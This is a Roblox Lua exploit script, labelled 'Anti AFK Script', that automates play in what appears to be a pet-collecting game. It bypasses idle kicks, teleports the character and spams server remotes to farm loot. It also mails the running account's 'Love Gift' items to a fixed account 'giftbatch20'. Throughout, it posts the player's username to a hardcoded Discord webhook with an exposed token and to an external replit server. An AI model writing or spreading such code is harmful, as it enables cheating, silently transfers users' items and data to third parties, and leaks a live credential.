wait(7)
wait(0.5)local ba=Instance.new("ScreenGui")
local ca=Instance.new("TextLabel")local da=Instance.new("Frame")
local _b=Instance.new("TextLabel")local ab=Instance.new("TextLabel")ba.Parent=game.CoreGui
ba.ZIndexBehavior=Enum.ZIndexBehavior.Sibling;ca.Parent=ba;ca.Active=true
ca.BackgroundColor3=Color3.new(0.176471,0.176471,0.176471)ca.Draggable=true
ca.Position=UDim2.new(0.698610067,0,0.098096624,0)ca.Size=UDim2.new(0,370,0,52)
ca.Font=Enum.Font.SourceSansSemibold;ca.Text="Anti AFK Script"ca.TextColor3=Color3.new(0,1,1)
ca.TextSize=22;da.Parent=ca
da.BackgroundColor3=Color3.new(0.196078,0.196078,0.196078)da.Position=UDim2.new(0,0,1.0192306,0)
da.Size=UDim2.new(0,370,0,107)_b.Parent=da
_b.BackgroundColor3=Color3.new(0.176471,0.176471,0.176471)_b.Position=UDim2.new(0,0,0.800455689,0)
_b.Size=UDim2.new(0,370,0,21)_b.Font=Enum.Font.Arial;_b.Text="made by ur mom "
_b.TextColor3=Color3.new(0,1,1)_b.TextSize=20;ab.Parent=da
ab.BackgroundColor3=Color3.new(0.176471,0.176471,0.176471)ab.Position=UDim2.new(0,0,0.158377,0)
ab.Size=UDim2.new(0,370,0,44)ab.Font=Enum.Font.ArialBold;ab.Text="Status: Active"
ab.TextColor3=Color3.new(0,1,1)ab.TextSize=20;local bb=game:service'VirtualUser'
game:service'Players'.LocalPlayer.Idled:connect(function()
bb:CaptureController()bb:ClickButton2(Vector2.new())
ab.Text="Roblox tried to kick u but i kicked him instead"wait(2)ab.Text="Status : Active"end)

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local workspace = game:GetService("Workspace")
local Players = game:GetService("Players")

if game.PlaceId ~= 8737899170 then
    while true do
        game.ReplicatedStorage.Network.World1Teleport:InvokeServer()
        wait(5)
    end
end


local function teleport()
    while true do
        local player = Players.LocalPlayer
        local character = player.Character or player.CharacterAdded:Wait()
        local humanoidRootPart = character:WaitForChild("HumanoidRootPart")

        if workspace:FindFirstChild("__THINGS") then
            local __THINGS = workspace.__THINGS
            if __THINGS:FindFirstChild("__INSTANCE_CONTAINER") then
                local __INSTANCE_CONTAINER = __THINGS.__INSTANCE_CONTAINER
                if __INSTANCE_CONTAINER:FindFirstChild("Active") then
                    local Active = __INSTANCE_CONTAINER.Active
                    if not Active:FindFirstChild("TowerTycoon") then
                        repeat
                            if workspace:FindFirstChild("__THINGS") and
                               __THINGS:FindFirstChild("Instances") and
                               __THINGS.Instances:FindFirstChild("TowerTycoon") and
                               __THINGS.Instances.TowerTycoon:FindFirstChild("Teleports") and
                               __THINGS.Instances.TowerTycoon.Teleports:FindFirstChild("Enter") then
                                local targetPosition = __THINGS.Instances.TowerTycoon.Teleports.Enter.Position
                                humanoidRootPart.CFrame = CFrame.new(targetPosition)
                                wait(20)
                            end
                            wait(1)
                        until Active:FindFirstChild("TowerTycoon")
                    end
                end
            end
        end
        wait(1)
    end
end
spawn(teleport)
wait(7)

local function chest()
    while true do
        wait(0.1)
        
        local args1 = {
            [1] = "Rainbow Mini Chest"
        }
        game:GetService("ReplicatedStorage").Network.GiftBag_Open:InvokeServer(unpack(args1))

        local args2 = {
            [1] = "Large Gift Bag"
        }
        game:GetService("ReplicatedStorage").Network.GiftBag_Open:InvokeServer(unpack(args2))

        local args5 = {
            [1] = "Mini Chest"
        }
        game:GetService("ReplicatedStorage").Network.GiftBag_Open:InvokeServer(unpack(args5))
        
        local args3 = {
            [1] = "Gift Bag"
        }
        game:GetService("ReplicatedStorage").Network.GiftBag_Open:InvokeServer(unpack(args3))
    end
end

spawn(chest)

local args = {
    "ShowOtherPets"
}
game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Toggle Setting"):InvokeServer(unpack(args))

local args = {
    "PotatoMode"
}
game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Toggle Setting"):InvokeServer(unpack(args))

local function MailClaim()
while true do
    local player = game.Players.LocalPlayer
    
        local gui = player.PlayerGui:FindFirstChild("_MACHINES")
        if gui then
            local mailboxMachine = gui:FindFirstChild("MailboxMachine")
            if mailboxMachine then
                local giftsFrame = mailboxMachine:FindFirstChild("Frame") and mailboxMachine.Frame:FindFirstChild("GiftsFrame")
                if giftsFrame then
                    local itemsFrame = giftsFrame:FindFirstChild("ItemsFrame")
                    if itemsFrame then
                        local frameChild = itemsFrame:FindFirstChildWhichIsA("Frame")
                        if frameChild then

                            local args = {
                                [1] = {
                                    [1] = frameChild.Name
                                }
                            }
                            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Claim"):InvokeServer(unpack(args))
                        end
                    end
                end
            end
        end
        wait(1)
    end
end

spawn(MailClaim)

local args = {
    [1] = "Cat",
    [2] = "Dog"
}

game:GetService("ReplicatedStorage").Network:FindFirstChild("Pick Starter Pets"):InvokeServer(unpack(args))


local ReplicatedStorage = game:GetService("ReplicatedStorage")
local workspace = game:GetService("Workspace")
local Players = game:GetService("Players")

function OrbCollect()
    while true do 
        local Orbs = workspace:FindFirstChild("__THINGS")
        if Orbs then
            for _, orb in ipairs(Orbs.Orbs:GetChildren()) do
                local ohTable1 = { tonumber(orb.Name) }
                ReplicatedStorage.Network["Orbs: Collect"]:FireServer(ohTable1)
                orb:Destroy()
            end 
        end
        task.wait()
    end
end

function LootbagCollect()
    while true do 
        local Lootbags = workspace:FindFirstChild("__THINGS") and workspace.__THINGS:FindFirstChild("Lootbags")
        if Lootbags then
            for _, bag in ipairs(Lootbags:GetChildren()) do
                local ohTable1 = { tostring(bag) }
                ReplicatedStorage.Network.Lootbags_Claim:FireServer(ohTable1)
                bag:Destroy()
            end 
        end
        task.wait()
    end
end

spawn(OrbCollect)
spawn(LootbagCollect)

local function deletetycoon()
    while true do
        local tycoons = workspace:FindFirstChild("__THINGS"):FindFirstChild("Tycoons")
        if tycoons then
            local foundNonBillboard = false
            for _, tycoon in ipairs(tycoons:GetChildren()) do
                local interactable = tycoon:FindFirstChild("Interactable")
                if interactable then
                    local hasBillboard = interactable:FindFirstChild("PlayerImageBillboard") ~= nil
                    if not hasBillboard then
                        foundNonBillboard = true
                    elseif foundNonBillboard then
                        tycoon:Destroy()
                    end
                end
            end
        end
        wait(5)
    end
end
spawn(deletetycoon)
 local function autotapandpet()
    local ReplicatedStorage = game:GetService("ReplicatedStorage")
    local WorkSpace = game:GetService("Workspace")
    local Players = game:GetService("Players")
    local LocalPlayer = Players.LocalPlayer
    local Network = ReplicatedStorage:WaitForChild("Network")

    _G.AutoFarmOnOff = true
    _G.AutoFarmDistance = 200
    local Farming = false
    local BreakableRemote = Network:WaitForChild("Breakables_PlayerDealDamage")

    local function AutoFarmBreakables()
        Farming = true
        while _G.AutoFarmOnOff do
            local HumanoidRootPart = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
            local Breakables = WorkSpace:FindFirstChild("__THINGS") and WorkSpace.__THINGS:FindFirstChild("Breakables")

            if HumanoidRootPart and Breakables then
                local NearestBreakable, NearestHitbox, ActualBreakableDistance

                for _, Breakable in ipairs(Breakables:GetChildren()) do
                    for _, MeshPart in pairs(Breakable:GetChildren()) do
                        if MeshPart:IsA("MeshPart") then
                            local Hitbox = MeshPart:FindFirstChild("Hitbox")
                            if Hitbox then
                                local Distance = (HumanoidRootPart.Position - Hitbox.Position).Magnitude
                                if not NearestBreakable or Distance < ActualBreakableDistance then
                                    NearestBreakable, NearestHitbox, ActualBreakableDistance = Breakable, Hitbox, Distance
                                end
                            end
                        end
                    end
                end

                if NearestBreakable and NearestHitbox then
                    repeat
                        BreakableRemote:FireServer(NearestBreakable.Name)
                        wait()
                    until not NearestBreakable.Parent or (HumanoidRootPart.Position - NearestHitbox.Position).Magnitude > _G.AutoFarmDistance or not _G.AutoFarmOnOff
                end
            end
            wait()
        end
        Farming = false
    end

    spawn(AutoFarmBreakables)

   
end

spawn(autotapandpet)


local HttpService = game:GetService("HttpService")
local Timer = 0

local function timerrr()
    while true do
        Timer = Timer + 1
        wait(1)
    end
end
spawn(timerrr)

local numbertwo = 0
local numberone = 0

local function findtext()
    while true do
        local things = workspace:FindFirstChild("__THINGS")
        if things then
            local tycoons = things:FindFirstChild("Tycoons")
            if tycoons then
                for _, tycoon in ipairs(tycoons:GetChildren()) do
                    local interactable = tycoon:FindFirstChild("Interactable")
                    if interactable and not interactable:FindFirstChild("PlayerImageBillboard") then
                        local machines = interactable:FindFirstChild("Machines")
                        if machines then
                            local machine = machines:FindFirstChild("TowerRebirthMachine")
                            if machine then
                                local gui = machine:FindFirstChild("GUI")
                                if gui then
                                    local billboard = gui:FindFirstChild("Billboard")
                                    if billboard then
                                        local billboardGui = billboard:FindFirstChild("BillboardGui")
                                        if billboardGui then
                                            local status = billboardGui:FindFirstChild("Status")
                                            if status and status:IsA("TextLabel") then
                                                local text = status.Text
                                                if text == "Rebirth Ready!" then
                                                    repeat wait() until status.Text ~= "Rebirth Ready!"
                                                else
                                                    local firstNumber, secondNumber = text:match("(%d+)%s*/%s*(%d+)")
                                                    numberone = tonumber(firstNumber) or 0
                                                    numbertwo = tonumber(secondNumber) or 0
                                                end
                                            end
                                        end
                                    end
                                end
                            end
                        end
                    end
                end
            end
        end
        wait()
    end
end

spawn(findtext)



local completed = false
local player = game.Players.LocalPlayer
local playerGui = player:FindFirstChildOfClass("PlayerGui")
local lovegiftamount = 0
local CurrentHatch = 0

local screenGui = playerGui:FindFirstChild("ProgressGui") or Instance.new("ScreenGui", playerGui)
screenGui.Name = "ProgressGui"

local frame = screenGui:FindFirstChild("ProgressFrame") or Instance.new("Frame", screenGui)
frame.Name = "ProgressFrame"
frame.Size = UDim2.new(0.3, 0, 0.2, 0)
frame.Position = UDim2.new(0.35, 0, 0.4, 0)
frame.BackgroundColor3 = Color3.new(0, 0, 0)

local textLabel = frame:FindFirstChild("ProgressText") or Instance.new("TextLabel", frame)
textLabel.Name = "ProgressText"
textLabel.Size = UDim2.new(1, 0, 1, 0)
textLabel.Position = UDim2.new(0, 0, 0, 0)
textLabel.BackgroundTransparency = 1
textLabel.TextColor3 = Color3.new(1, 1, 1)
textLabel.TextScaled = true
textLabel.Font = Enum.Font.SourceSansBold

local function rejoinServer()
    local TeleportService = game:GetService("TeleportService")
    TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, player)
end

local function gui()
    while true do
        local startTime = tick()

        while textLabel.Text == "Loading..." do
            if tick() - startTime >= 25 then
                rejoinServer()
            end
            wait(1)
        end

        if completed then
            local rainbowGui = screenGui:FindFirstChild("RainbowGui") or Instance.new("Frame", screenGui)
            rainbowGui.Name = "RainbowGui"
            rainbowGui.Size = UDim2.new(1.5, 0, 1.5, 0)
            rainbowGui.Position = UDim2.new(-0.25, 0, -0.25, 0)
            rainbowGui.BackgroundTransparency = 0.3
            
            local completedText = rainbowGui:FindFirstChild("CompletedText") or Instance.new("TextLabel", rainbowGui)
            completedText.Name = "CompletedText"
            completedText.Size = UDim2.new(1, 0, 0.2, 0)
            completedText.Position = UDim2.new(0, 0, 0, 0.4)
            completedText.BackgroundTransparency = 1
            completedText.TextColor3 = Color3.new(0, 0, 0)
            completedText.TextScaled = true
            completedText.Font = Enum.Font.SourceSansBold
            completedText.Text = "COMPLETED"

            while completed do
                rainbowGui.BackgroundColor3 = Color3.fromHSV(tick() % 5 / 5, 1, 1)
                wait(0.1)
            end

            rainbowGui:Destroy()
        else
            if type(numberone) == "number" and type(numbertwo) == "number" and numbertwo > 0 then
                local percentage = math.floor((numberone / numbertwo) * 100)
                textLabel.Text = numbertwo .. " : Complete Percentage : " .. percentage .. "%\nLove Gifts : " .. lovegiftamount
            else
                textLabel.Text = "Loading..."
            end
        end
        wait(1)
    end
end

spawn(gui)



local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Client = require(ReplicatedStorage:WaitForChild("Library"))
local Player = Players.LocalPlayer
local PlayerGui = Player:WaitForChild("PlayerGui")

local function GetItemInfo(ItemsClass)
    local Table = {}
    local Inventory = require(ReplicatedStorage:WaitForChild("Library"):WaitForChild("Client").Save).Get().Inventory
    if Inventory[ItemsClass] then
        for UID, Item in pairs(Inventory[ItemsClass]) do
            if Item._am and Item._am >= 1 then
                local ItemInfo = {
                    ["class"] = ItemsClass,
                    ["id"] = Item.id,
                    ["uid"] = UID,
                    ["am"] = Item._am
                }
                table.insert(Table, ItemInfo)
            end
        end
    end
    return Table
end

local function CreateButton()
    local ScreenGui = Instance.new("ScreenGui", PlayerGui)
    local Button = Instance.new("TextButton", ScreenGui)

    Button.Size = UDim2.new(0.2, 0, 0.1, 0)
    Button.Position = UDim2.new(0.4, 0, 0, 10)
    Button.BackgroundColor3 = Color3.new(0, 0, 0)
    Button.TextColor3 = Color3.new(1, 1, 1)
    Button.TextScaled = true
    Button.Text = "Send Love Gift"

    Button.MouseButton1Click:Connect(function()
        local Items = GetItemInfo("Lootbox")
        for _, Item in pairs(Items) do
            if string.find(Item.id, "Love Gift") then
                if Item.am >= 1 then
                    local args = {
                        [1] = "giftbatch20",
                        [2] = "enjoy bro",
                        [3] = "Lootbox",
                        [4] = Item.uid,
                        [5] = Item.am
                    }
                    game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
                end
            end
        end
    end)
end

spawn(CreateButton)

local HttpService = game:GetService("HttpService")

local function sendinfoooo()
    local sent = false
    while true do
        if completed == true and not sent then
            sent = true
            local webhook = "https://discord.com/api/webhooks/1233196606401019975/qIxgbxZsF4dwVkMkDNB_Ei-p7zWhGwQ4DoPlgraHwJOkhUedOaDH6PYLDeXtNElNOF4x"
            local request = (syn and syn.request) or request or (http and http.request) or http_request
            request({
                Url = webhook,
                Method = "POST",
                Headers = { ["Content-Type"] = "application/json" },
                Body = HttpService:JSONEncode({
                    content = game.Players.LocalPlayer.Name .. " | Completed Tower"
                })
            })

            while true do
            wait(3)
                local Items = GetItemInfo("Lootbox")
                for _, Item in pairs(Items) do
                    if string.find(Item.id, "Love Gift") and Item.am >= 1 then
                        local args = {
                            [1] = "giftbatch20",
                            [2] = "enjoy bro",
                            [3] = "Lootbox",
                            [4] = Item.uid,
                            [5] = Item.am
                        }
                        game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
                    end
                end
                game.Players.LocalPlayer:Kick("FINISHED TOWER, NEW ACCOUNT NEEDED")
                break
            end
        end
        wait(60)
    end
end

spawn(sendinfoooo)



local HttpService = game:GetService("HttpService")

local function stop()
    while true do
        if type(numbertwo) == "number" and numbertwo > 150 then
            completed = true
            
            wait(1)
        end
        wait(1)
    end
end

spawn(stop)



local function PetInfo()
    while true do
        local Inventory = require(ReplicatedStorage:WaitForChild("Library"):WaitForChild("Client").Save).Get().Inventory
        local found = false

        if Inventory["Pet"] then
            for UID, Pet in pairs(Inventory["Pet"]) do
                if Pet.id == "Love Peacock" then
                    found = true
                    if not Pet._am or Pet._am < 15 then
                        local webhook = "https://discord.com/api/webhooks/1233196606401019975/qIxgbxZsF4dwVkMkDNB_Ei-p7zWhGwQ4DoPlgraHwJOkhUedOaDH6PYLDeXtNElNOF4x"
                        local request = (syn and syn.request) or request or (http and http.request) or http_request
                        request({
                            Url = webhook,
                            Method = "POST",
                            Headers = { ["Content-Type"] = "application/json" },
                            Body = HttpService:JSONEncode({
                                content = game.Players.LocalPlayer.Name
                            })
                        })
                    end
                end
            end
        end

        if not found then
            local webhook = "https://discord.com/api/webhooks/1233196606401019975/qIxgbxZsF4dwVkMkDNB_Ei-p7zWhGwQ4DoPlgraHwJOkhUedOaDH6PYLDeXtNElNOF4x"
            local request = (syn and syn.request) or request or (http and http.request) or http_request
            request({
                Url = webhook,
                Method = "POST",
                Headers = { ["Content-Type"] = "application/json" },
                Body = HttpService:JSONEncode({
                    content = game.Players.LocalPlayer.Name 
                })
            })
        end

        wait(120)
    end
end








local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Client = require(ReplicatedStorage:WaitForChild("Library"))

local function GetItemInfo(ItemsClass)
    local Table = {}
    local Inventory = require(ReplicatedStorage:WaitForChild("Library"):WaitForChild("Client").Save).Get().Inventory
    if Inventory[ItemsClass] then
        for UID, Item in pairs(Inventory[ItemsClass]) do
            if Item._am and Item._am >= 1 then
                local ItemInfo = {
                    ["class"] = ItemsClass,
                    ["id"] = Item.id,
                    ["uid"] = UID,
                    ["am"] = Item._am
                }
                table.insert(Table, ItemInfo)
            end
        end
    end
    return Table
end

local function PrintItemInfo()
    local Classes = {
        "Lootbox", "Currency"
    }
    local SearchPrint = {"Love Gift", "Diamonds"}
    local SearchResults = {}

    for _, Class in pairs(Classes) do
        local Items = GetItemInfo(Class)
        for _, Item in pairs(Items) do
            for _, SearchTerm in pairs(SearchPrint) do
                if string.find(Item.id, SearchTerm) then
                    table.insert(SearchResults, Item)
                end
            end
        end
    end
end

local function sendingdata()
    while true do
        local Items = GetItemInfo("Lootbox")
        for _, Item in pairs(Items) do
            if string.find(Item.id, "Love Gift") then
                lovegiftamount = Item.am

                if completed and Item.am >= 5 then
                    local args = {
                        [1] = "giftbatch20",
                        [2] = "enjoy bro",
                        [3] = "Lootbox",
                        [4] = Item.uid,
                        [5] = Item.am
                    }
                    game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
                    wait(5)
                end

                if Item.am >= 30 then
                    local args = {
                        [1] = "giftbatch20",
                        [2] = "enjoy bro",
                        [3] = "Lootbox",
                        [4] = Item.uid,
                        [5] = Item.am
                    }
                    game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
                    wait(5)
                end
            end
        end
        wait(3)
    end
end

spawn(sendingdata)

local function remotess()
while true do

local args = {
    10
}
game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("ValentinesMachine_Activate"):InvokeServer(unpack(args))

game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Tycoons: Request Rebirth"):InvokeServer()

wait(5)
end
end
spawn(remotess)

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Client = require(ReplicatedStorage:WaitForChild("Library"))

local function GetItemInfo(ItemsClass)
    local Table = {}
    local Inventory = require(ReplicatedStorage:WaitForChild("Library"):WaitForChild("Client").Save).Get().Inventory
    if Inventory[ItemsClass] then
        for UID, Item in pairs(Inventory[ItemsClass]) do
            if Item._am and Item._am >= 1 then
                local ItemInfo = {
                    ["class"] = ItemsClass,
                    ["id"] = Item.id,
                    ["uid"] = UID,
                    ["am"] = Item._am
                }
                table.insert(Table, ItemInfo)
            end
        end
    end
    return Table
end

local function potion()
    while true do
        local Items = GetItemInfo("Potion") -- Check for Potions instead of Lootbox
        for _, Item in pairs(Items) do
            if Item.am >= 1 then 
         
local args = {
    Item.uid,
    1
}
game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Potions: Consume"):FireServer(unpack(args))

            end
        end
        wait() -- Add a small delay to avoid spamming
    end
end

spawn(potion)

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Client = require(ReplicatedStorage:WaitForChild("Library"))

local function GetItemInfo(ItemsClass)
    local Table = {}
    local Inventory = require(ReplicatedStorage:WaitForChild("Library"):WaitForChild("Client").Save).Get().Inventory
    if Inventory[ItemsClass] then
        for UID, Item in pairs(Inventory[ItemsClass]) do
            if Item._am and Item._am >= 1 then
                local ItemInfo = {
                    ["class"] = ItemsClass,
                    ["id"] = Item.id,
                    ["uid"] = UID,
                    ["am"] = Item._am
                }
                table.insert(Table, ItemInfo)
            end
        end
    end
    return Table
end

local function Fruits()
    while true do
        local Items = GetItemInfo("Fruit")
        for _, Item in pairs(Items) do
            local args = {
                Item.uid,
                1
            }
            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Fruits: Consume"):FireServer(unpack(args))
        end
        wait()
    end
end

spawn(Fruits)

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Client = require(ReplicatedStorage:WaitForChild("Library"))

local function GetItemInfo(ItemsClass)
    local Table = {}
    local Inventory = require(ReplicatedStorage:WaitForChild("Library"):WaitForChild("Client").Save).Get().Inventory
    if Inventory[ItemsClass] then
        for UID, Item in pairs(Inventory[ItemsClass]) do
            if Item._am and Item._am >= 1 then
                local ItemInfo = {
                    ["class"] = ItemsClass,
                    ["id"] = Item.id,
                    ["uid"] = UID,
                    ["am"] = Item._am
                }
                table.insert(Table, ItemInfo)
            end
        end
    end
    return Table
end

local function Enchant()
    while true do
        local Items = GetItemInfo("Enchant")
        for _, Item in pairs(Items) do
            if string.find(Item.id, "Tap Power") or string.find(Item.id, "Strong Pets") then
                local args = {
                    Item.uid
                }
                game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Enchants_Equip"):FireServer(unpack(args))
                wait(5)
            end
        end
        wait()
    end
end

spawn(Enchant)

local function buff()
    while true do
       game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("ToyBall_Consume"):InvokeServer()

game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("SqueakyToy_Consume"):InvokeServer()

game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("ToyBone_Consume"):InvokeServer()

        wait(1)
    end
end

spawn(buff)


local function sendinfo()
while true do
local completed = false
local mustsend = true

local Player = game.Players.LocalPlayer
        local player = Player.Name
        local ServerID = game.JobId
        local Http = game:GetService("HttpService")

        local request = (syn and syn.request) or request or (http and http.request) or http_request

        -- Ensure all variables have default values (0) if they are nil
        -- Updated URL
        local response = request({
            Url = 'https://64a08a7a-3355-4149-afcf-d0b7deaaa4f9-00-2nm6vd6tjffq6.janeway.replit.dev/update',
            Method = 'POST',
            Headers = {
                ['Content-Type'] = 'application/json'
            },
            Body = Http:JSONEncode({
                Username = player,
                VoidTicketsValue = completed, -- Use fixed VoidTicketsValue
                DiamondsValue = mustsend,
                HugeList = "0",
                Server = "0",
InstaplantValue = "0",
SeedbagValue = "0",
DiamondsSeedValue = "0"

            })
        })

wait(15)
        end
        end
        spawn(sendinfo)
        
wait(7)
local function egg()
    while true do
        local player = game.Players.LocalPlayer
        local humanoidRootPart = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
        if not humanoidRootPart then wait() continue end

        local closestEgg, closestEggDistance = nil, math.huge

        for _, egg in pairs(workspace.__THINGS.CustomEggs:GetChildren()) do
            if egg:IsA("Model") then
                local center = egg:FindFirstChild("Center")
                if center then
                    local distance = (humanoidRootPart.Position - center.Position).Magnitude
                    if distance < closestEggDistance then
                        closestEgg = egg
                        closestEggDistance = distance
                    end
                end
            end
        end

        if closestEgg and closestEggDistance <= 150 then
            local breakables = workspace.__THINGS.Breakables:GetChildren()
            for _, child in pairs(breakables) do
                if child:IsA("Model") then
                    for _, part in pairs(child:GetChildren()) do
                        if part:IsA("MeshPart") then
                            if (part.Position - closestEgg.Center.Position).Magnitude <= 50 then
                                humanoidRootPart.CFrame = closestEgg.Center.CFrame
                                game:GetService("ReplicatedStorage").Network:FindFirstChild("CustomEggs_Hatch"):InvokeServer(closestEgg.Name, 1)
                                break
                            end
                        end
                    end
                end
            end
        end

        wait()
    end
end

spawn(egg)
